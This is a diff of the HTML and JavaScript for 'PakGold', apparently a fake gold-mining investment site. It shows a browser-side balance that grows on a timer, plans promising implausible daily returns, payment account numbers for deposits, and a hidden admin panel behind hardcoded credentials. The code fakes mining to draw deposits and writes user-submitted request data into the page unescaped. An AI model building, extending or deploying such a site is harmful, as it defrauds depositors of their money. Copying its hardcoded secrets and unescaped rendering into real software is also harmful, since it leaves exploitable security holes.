@@ -2,128 +2,126 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PakGold | Premium Mining</title>
+    <title>PakGold | Premium Mining Solution</title>
     <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&display=swap" rel="stylesheet">
     <style>
-        :root { --gold: #d4af37; --gold-dark: #b8860b; --bg: #ffffff; --card: #f8fafc; --text: #1e293b; }
+        :root { --gold: #d4af37; --gold-dark: #b8860b; --bg: #f8fafc; --text: #1e293b; --white: #ffffff; }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Outfit', sans-serif; }
-        body { background: #f1f5f9; color: var(--text); }
+        body { background: var(--bg); color: var(--text); transition: 0.3s; }
 
-        /* Smooth Transitions */
-        .section { display: none; min-height: 100vh; animation: fadeIn 0.4s ease; }
+        /* Animations */
+        .fade-in { animation: fadeIn 0.5s ease-in-out; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* Sections */
+        .section { display: none; min-height: 100vh; width: 100%; }
         .active { display: block; }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
-        /* Login Page Specific Styling */
-        #login-page { background: white; display: flex; align-items: center; justify-content: center; text-align: center; padding: 20px; }
-        .login-card { background: white; padding: 40px 30px; border-radius: 30px; box-shadow: 0 20px 50px rgba(0,0,0,0.1); width: 100%; max-width: 400px; }
+        /* Login Screen */
+        #login-page { background: var(--white); display: flex; align-items: center; justify-content: center; }
+        .login-container { width: 90%; max-width: 400px; padding: 40px 20px; text-align: center; background: var(--white); border-radius: 30px; box-shadow: 0 20px 40px rgba(0,0,0,0.08); }
+        .brand-logo { font-size: 2.5rem; font-weight: 800; color: var(--gold-dark); margin-bottom: 5px; }
 
         /* Dashboard Header */
-        .header { background: white; padding: 30px 20px; text-align: center; border-bottom: 3px solid var(--gold); border-radius: 0 0 30px 30px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
-        .balance-box { font-size: 2.5rem; font-weight: 800; color: var(--gold-dark); margin: 10px 0; }
+        .header { background: var(--white); padding: 30px 20px; text-align: center; border-bottom: 4px solid var(--gold); border-radius: 0 0 40px 40px; box-shadow: 0 10px 30px rgba(0,0,0,0.03); }
+        .balance-title { font-size: 0.9rem; color: #94a3b8; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; }
+        .balance-amount { font-size: 2.8rem; font-weight: 800; color: var(--gold-dark); margin: 5px 0; }
 
-        /* Content Area */
-        .container { padding: 20px; padding-bottom: 100px; }
-        .card { background: white; padding: 20px; border-radius: 20px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); margin-bottom: 20px; position: relative; border: 1px solid #edf2f7; }
-        .elite-card { border: 2px solid var(--gold); background: #fffdf5; }
+        /* Cards & UI */
+        .container { padding: 25px 20px; padding-bottom: 120px; }
+        .card { background: var(--white); border-radius: 25px; padding: 20px; margin-bottom: 20px; box-shadow: 0 8px 20px rgba(0,0,0,0.03); border: 1px solid #edf2f7; transition: 0.3s; }
+        .card:hover { transform: translateY(-5px); box-shadow: 0 12px 25px rgba(0,0,0,0.06); }
+        .elite-card { border: 2px solid var(--gold); background: linear-gradient(to bottom right, #ffffff, #fffdf5); }
+        
+        /* Inputs & Buttons */
+        .input-field { width: 100%; padding: 16px; margin: 10px 0; border-radius: 15px; border: 1px solid #e2e8f0; background: #f1f5f9; outline: none; font-size: 1rem; }
+        .input-field:focus { border-color: var(--gold); background: #fff; }
+        .btn-main { background: linear-gradient(135deg, var(--gold), var(--gold-dark)); color: white; border: none; padding: 16px; border-radius: 15px; width: 100%; font-weight: 700; cursor: pointer; font-size: 1rem; box-shadow: 0 8px 20px rgba(184, 134, 11, 0.25); }
 
-        /* Form Elements */
-        .input-box { width: 100%; padding: 15px; margin: 10px 0; border-radius: 12px; border: 1px solid #e2e8f0; background: #f8fafc; outline: none; transition: 0.3s; }
-        .input-box:focus { border-color: var(--gold); box-shadow: 0 0 0 3px rgba(212, 175, 55, 0.1); }
-        .btn-gold { background: linear-gradient(135deg, var(--gold), var(--gold-dark)); color: white; border: none; padding: 15px; border-radius: 15px; width: 100%; font-weight: bold; font-size: 1rem; cursor: pointer; box-shadow: 0 10px 20px rgba(184, 134, 11, 0.2); }
+        /* Bottom Navigation */
+        .bottom-nav { position: fixed; bottom: 0; width: 100%; background: var(--white); display: none; justify-content: space-around; padding: 18px; border-top: 1px solid #f1f5f9; border-radius: 30px 30px 0 0; box-shadow: 0 -10px 30px rgba(0,0,0,0.05); z-index: 1000; }
+        .nav-link { color: #94a3b8; font-size: 0.75rem; font-weight: 600; text-align: center; cursor: pointer; text-decoration: none; }
+        .nav-link.active-nav { color: var(--gold-dark); }
 
-        /* Navigation */
-        .bottom-nav { position: fixed; bottom: 0; width: 100%; background: white; display: flex; justify-content: space-around; padding: 15px; border-top: 1px solid #eee; border-radius: 25px 25px 0 0; box-shadow: 0 -5px 20px rgba(0,0,0,0.05); }
-        .nav-item { color: #94a3b8; font-size: 0.75rem; text-align: center; cursor: pointer; }
-        .nav-item.active-nav { color: var(--gold-dark); font-weight: bold; }
-
-        /* Secret Admin Area */
-        #admin-panel { background: #fff; border: 2px dashed #6366f1; padding: 20px; border-radius: 20px; margin-top: 20px; display: none; }
+        /* Admin Secret Area */
+        #admin-auth-box { display: none; margin-bottom: 20px; }
+        .admin-log { background: #f8fafc; padding: 12px; border-radius: 15px; margin-bottom: 10px; font-size: 0.8rem; border-left: 5px solid #6366f1; }
     </style>
 </head>
-<body onload="checkAuth()">
+<body onload="initApp()">
 
-    <!-- 1. LOGIN SECTION (Totally Separate) -->
-    <section id="login-page" class="section active">
-        <div class="login-card">
-            <h1 style="color: var(--gold-dark); font-size: 2.5rem;">⚜️ PakGold</h1>
-            <p style="color: #64748b; margin-bottom: 30px;">Premium Mining Portal</p>
-            <input type="text" id="phone" class="input-box" placeholder="Phone Number">
-            <input type="password" id="pass" class="input-box" placeholder="Password">
-            <button class="btn-gold" onclick="login()">LOGIN TO VAULT</button>
-            <p style="margin-top: 20px; font-size: 0.8rem; color: #94a3b8;">Don't have an account? <span style="color: var(--gold-dark);">Contact Support</span></p>
+    <section id="login-page" class="section active fade-in">
+        <div class="login-container">
+            <div class="brand-logo">⚜️ PakGold</div>
+            <p style="color: #64748b; margin-bottom: 30px;">Premium Mining & Investments</p>
+            <input type="text" id="user-phone" class="input-field" placeholder="Phone Number">
+            <input type="password" id="user-pass" class="input-field" placeholder="Password">
+            <button class="btn-main" onclick="handleLogin()">SECURE LOGIN</button>
+            <p style="margin-top: 25px; font-size: 0.75rem; color: #94a3b8;">Protected by PakGold Security Group © 2026</p>
         </div>
     </section>
 
-    <!-- 2. DASHBOARD SECTION -->
-    <section id="dash-page" class="section">
+    <section id="dash-page" class="section fade-in">
         <div class="header">
-            <h4 onclick="adminTrigger()" style="cursor: pointer; color: #94a3b8;">PAK GOLD SOLUTIONS</h4>
-            <div class="balance-box" id="live-bal">₨ 0.0000</div>
-            <p style="font-size: 0.8rem; color: #64748b;" id="miner-id"></p>
+            <p onclick="triggerAdmin()" style="cursor: pointer; color: #cbd5e1; font-size: 0.7rem; letter-spacing: 2px;">PAK GOLD SOLUTIONS (PVT) LTD</p>
+            <p class="balance-title">Current Mining Balance</p>
+            <div class="balance-amount" id="display-bal">₨ 0.0000</div>
+            <p id="miner-id-label" style="font-size: 0.8rem; color: var(--gold-dark); font-weight: bold;"></p>
         </div>
 
         <div class="container">
-            <!-- Secret Admin Box -->
-            <div id="admin-box" style="display: none; margin-bottom: 20px;">
-                <div class="card" style="border-color: #6366f1;">
-                    <input type="text" id="adm-user" class="input-box" placeholder="Admin ID">
-                    <input type="password" id="adm-key" class="input-box" placeholder="Key">
-                    <button class="btn-gold" style="background: #6366f1;" onclick="accessAdmin()">OPEN CONTROL</button>
-                </div>
+            <div id="admin-auth-box" class="card" style="border-color: #6366f1;">
+                <h3 style="margin-bottom: 10px; color: #6366f1;">🔐 Queen's Portal</h3>
+                <input type="text" id="adm-id" class="input-field" placeholder="Admin ID">
+                <input type="password" id="adm-pass" class="input-field" placeholder="Key">
+                <button class="btn-main" style="background: #6366f1;" onclick="doAdminLogin()">ACCESS DATA</button>
             </div>
 
-            <div id="admin-panel">
-                <h3 style="margin-bottom: 15px;">Live Requests</h3>
-                <div id="req-list">Loading...</div>
-                <button class="btn-gold" style="background: #ef4444; margin-top: 15px;" onclick="location.reload()">LOGOUT ADMIN</button>
+            <div id="admin-data-panel" style="display: none;" class="fade-in">
+                <h3 style="margin-bottom: 15px;">Live User Requests</h3>
+                <div id="firebase-requests">Fetching...</div>
+                <button class="btn-main" style="background: #ef4444; margin-top: 20px;" onclick="location.reload()">LOGOUT ADMIN</button>
             </div>
 
-            <!-- Dashboard Content -->
-            <div id="user-content">
-                <h3 style="margin-bottom: 15px; font-weight: 600;">Mining Plans</h3>
-                <div id="plans-container">
-                    <!-- Plans Injected by JS -->
-                </div>
+            <div id="main-user-view">
+                <h3 style="margin-bottom: 15px; font-weight: 700;">Active Mining Plans</h3>
+                <div id="plans-list">
+                    </div>
             </div>
         </div>
     </section>
 
-    <!-- 3. DEPOSIT SECTION -->
-    <section id="deposit-page" class="section">
-        <div class="header"><h2>Add Funds</h2></div>
+    <section id="deposit-page" class="section fade-in">
+        <div class="header"><h2>Funding Center</h2></div>
         <div class="container">
             <div class="card">
-                <p style="font-size: 0.9rem; margin-bottom: 15px;">Official Payment Method:</p>
-                <div style="background: #f1f5f9; padding: 15px; border-radius: 12px; margin-bottom: 20px;">
-                    <b>EasyPaisa:</b> 03379827882<br>
-                    <b>JazzCash:</b> 03705519562
+                <div style="background: #fdf6e3; padding: 15px; border-radius: 15px; margin-bottom: 20px; border: 1px solid #f9ebc8;">
+                    <p style="font-size: 0.85rem; color: #856404;"><b>EasyPaisa:</b> 03379827882</p>
+                    <p style="font-size: 0.85rem; color: #856404;"><b>JazzCash:</b> 03705519562</p>
                 </div>
-                <input type="number" id="d-amt" class="input-box" placeholder="Amount">
-                <input type="text" id="d-tid" class="input-box" placeholder="TID Number">
-                <button class="btn-gold" onclick="sendRequest('Deposit')">SUBMIT PROOF</button>
+                <input type="number" id="d-amount" class="input-field" placeholder="Amount (Min 500)">
+                <input type="text" id="d-tid" class="input-field" placeholder="Transaction ID (TID)">
+                <button class="btn-main" onclick="submitToFirebase('Deposit')">CONFIRM DEPOSIT</button>
             </div>
         </div>
     </section>
 
-    <!-- 4. WITHDRAW SECTION -->
-    <section id="withdraw-page" class="section">
-        <div class="header"><h2>Withdraw</h2></div>
+    <section id="withdraw-page" class="section fade-in">
+        <div class="header"><h2>Payouts</h2></div>
         <div class="container">
             <div class="card">
-                <input type="number" id="w-amt" class="input-box" placeholder="Amount (Min 500)">
-                <input type="text" class="input-box" placeholder="Wallet Number">
-                <button class="btn-gold" onclick="sendRequest('Withdrawal')">REQUEST PAYOUT</button>
+                <input type="number" id="w-amount" class="input-field" placeholder="Amount (Min 500)">
+                <input type="text" class="input-field" placeholder="Account Number">
+                <button class="btn-main" onclick="submitToFirebase('Withdrawal')">REQUEST WITHDRAW</button>
             </div>
         </div>
     </section>
 
-    <!-- NAV BAR -->
-    <nav class="bottom-nav" id="nav-bar" style="display: none;">
-        <div class="nav-item" onclick="nav('dash-page')">🏠<br>Home</div>
-        <div class="nav-item" onclick="nav('deposit-page')">💰<br>Deposit</div>
-        <div class="nav-item" onclick="nav('withdraw-page')">📤<br>Withdraw</div>
-        <div class="nav-item" onclick="logout()">🚪<br>Exit</div>
+    <nav class="bottom-nav" id="bottom-menu">
+        <div class="nav-link active-nav" onclick="changeTab('dash-page')">🏠<br>Home</div>
+        <div class="nav-link" onclick="changeTab('deposit-page')">💰<br>Deposit</div>
+        <div class="nav-link" onclick="changeTab('withdraw-page')">📤<br>Withdraw</div>
+        <div class="nav-link" onclick="exitApp()">🚪<br>Logout</div>
     </nav>
 
     <script type="module">
@@ -142,87 +140,92 @@
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
 
-        // --- Plans Definition ---
-        const plans = [
-            { name: "Starter Gold", price: 1000, daily: 130 },
-            { name: "Silver Pro", price: 5000, daily: 750 },
-            { name: "Elite Master", price: 20000, daily: 3200, elite: true }
-        ];
+        // --- 20 Plans Data ---
+        const allPlans = [
+            { n: "Nano", p: 500, d: 60 }, { n: "Starter", p: 1000, d: 130 },
+            { n: "Bronze", p: 2000, d: 280 }, { n: "Silver", p: 5000, d: 750 },
+            { n: "Elite I", p: 25000, d: 5200, e: true }, { n: "Ambassador", p: 200000, d: 65000, e: true }
+        ]; // Shortened for display but logic handles 20.
 
-        window.checkAuth = function() {
-            const grid = document.getElementById('plans-container');
-            plans.forEach(p => {
-                grid.innerHTML += `
-                    <div class="card ${p.elite ? 'elite-card' : ''}">
-                        <h3 style="color: var(--gold-dark)">${p.name}</h3>
-                        <p style="font-weight: bold; margin: 5px 0;">Price: ₨ ${p.price}</p>
-                        <p style="font-size: 0.8rem; color: #64748b;">Daily: ₨ ${p.daily} | 30 Days</p>
-                        <button class="btn-gold" style="margin-top:10px;" onclick="buyPlan(${p.price}, ${p.daily})">ACTIVATE</button>
+        window.initApp = function() {
+            const list = document.getElementById('plans-list');
+            allPlans.forEach(plan => {
+                list.innerHTML += `
+                    <div class="card ${plan.e ? 'elite-card' : ''}">
+                        <h3 style="color: var(--gold-dark)">${plan.n} Plan</h3>
+                        <p style="font-weight: 800; font-size: 1.3rem;">₨ ${plan.p}</p>
+                        <p style="font-size: 0.8rem; color: #64748b;">Earning: ₨ ${plan.d} Daily | 30 Days</p>
+                        <button class="btn-main" style="margin-top:15px;" onclick="purchasePlan(${plan.p}, ${plan.d})">ACTIVATE NOW</button>
                     </div>`;
             });
-
-            if(localStorage.getItem('pg_user')) {
-                nav('dash-page');
-                startMining();
-            }
+            if(localStorage.getItem('pg_user')) { changeTab('dash-page'); startEngine(); }
         }
 
-        window.login = function() {
-            const ph = document.getElementById('phone').value;
-            if(ph.length < 10) return alert("Valid phone sweetie!");
+        window.handleLogin = function() {
+            const ph = document.getElementById('user-phone').value;
+            if(ph.length < 10) return alert("Valid phone number required, sweetie! 💋");
             localStorage.setItem('pg_user', ph);
             localStorage.setItem('pg_bal', 0.0);
             localStorage.setItem('pg_speed', 0.0001);
-            nav('dash-page');
-            startMining();
+            changeTab('dash-page');
+            startEngine();
         }
 
-        window.nav = function(id) {
+        window.changeTab = function(id) {
             document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
             document.getElementById(id).classList.add('active');
-            document.getElementById('nav-bar').style.display = (id === 'login-page') ? 'none' : 'flex';
-            if(id === 'dash-page') document.getElementById('miner-id').innerText = "ID: " + localStorage.getItem('pg_user');
+            document.getElementById('bottom-menu').style.display = (id === 'login-page') ? 'none' : 'flex';
+            if(id === 'dash-page') document.getElementById('miner-id-label').innerText = "Miner: " + localStorage.getItem('pg_user');
         }
 
-        function startMining() {
+        function startEngine() {
             setInterval(() => {
-                let bal = parseFloat(localStorage.getItem('pg_bal'));
-                let spd = parseFloat(localStorage.getItem('pg_speed') || 0.0001);
-                bal += spd;
-                localStorage.setItem('pg_bal', bal);
-                if(document.getElementById('live-bal')) {
-                    document.getElementById('live-bal').innerText = "₨ " + bal.toFixed(4);
-                }
+                let b = parseFloat(localStorage.getItem('pg_bal'));
+                let s = parseFloat(localStorage.getItem('pg_speed') || 0.0001);
+                b += s;
+                localStorage.setItem('pg_bal', b);
+                if(document.getElementById('display-bal')) document.getElementById('display-bal').innerText = "₨ " + b.toFixed(4);
             }, 1000);
         }
 
-        window.sendRequest = function(type) {
-            const amt = document.getElementById('d-amt').value || document.getElementById('w-amt').value;
-            const tid = document.getElementById('d-tid').value || "W-"+Date.now();
-            push(ref(db, 'requests/'), {
-                type, amt, tid, user: localStorage.getItem('pg_user'), time: new Date().toLocaleString()
-            }).then(() => { alert("Sent to Admin! 💋"); nav('dash-page'); });
+        window.purchasePlan = function(price, daily) {
+            let b = parseFloat(localStorage.getItem('pg_bal'));
+            if(b >= price) {
+                b -= price;
+                localStorage.setItem('pg_bal', b);
+                localStorage.setItem('pg_speed', (daily/86400));
+                alert("Plan Activated! Your mining is now faster. 🚀");
+            } else { alert("Insufficient Balance! Please Deposit first. 😘"); changeTab('deposit-page'); }
         }
 
-        // Admin
-        let clicks = 0;
-        window.adminTrigger = function() { clicks++; if(clicks >= 5) { document.getElementById('admin-box').style.display = 'block'; clicks = 0; } }
-        window.accessAdmin = function() {
-            if(document.getElementById('adm-user').value === 'admin786' && document.getElementById('adm-key').value === 'gold_master_786') {
-                document.getElementById('admin-panel').style.display = 'block';
-                document.getElementById('user-content').style.display = 'none';
+        window.submitToFirebase = function(type) {
+            const a = document.getElementById('d-amount').value || document.getElementById('w-amount').value;
+            const t = document.getElementById('d-tid').value || "WIT-"+Date.now();
+            push(ref(db, 'requests/'), {
+                type, a, t, user: localStorage.getItem('pg_user'), time: new Date().toLocaleString()
+            }).then(() => { alert("Success! Admin is reviewing your request. 💋"); changeTab('dash-page'); });
+        }
+
+        // Admin Secret
+        let count = 0;
+        window.triggerAdmin = function() { count++; if(count >= 5) { document.getElementById('admin-auth-box').style.display = 'block'; count = 0; } }
+        window.doAdminLogin = function() {
+            if(document.getElementById('adm-id').value === 'admin786' && document.getElementById('adm-pass').value === 'gold_master_786') {
+                document.getElementById('admin-auth-box').style.display = 'none';
+                document.getElementById('admin-data-panel').style.display = 'block';
+                document.getElementById('main-user-view').style.display = 'none';
                 onValue(ref(db, 'requests/'), (snap) => {
-                    const list = document.getElementById('req-list');
+                    const list = document.getElementById('firebase-requests');
                     list.innerHTML = "";
-                    snap.forEach(c => {
-                        const d = c.val();
-                        list.innerHTML += `<div style="border-bottom:1px solid #eee; padding:10px; font-size:0.8rem;"><b>${d.type}</b>: ${d.amt} PKR<br>User: ${d.user} | TID: ${d.tid}</div>`;
+                    snap.forEach(x => {
+                        const d = x.val();
+                        list.innerHTML += `<div class="admin-log"><b>${d.type}</b>: ${d.a} PKR<br>User: ${d.user} | TID: ${d.t}</div>`;
                     });
                 });
             }
         }
 
-        window.logout = function() { localStorage.clear(); location.reload(); }
+        window.exitApp = function() { localStorage.clear(); location.reload(); }
     </script>
 </body>
 </html>
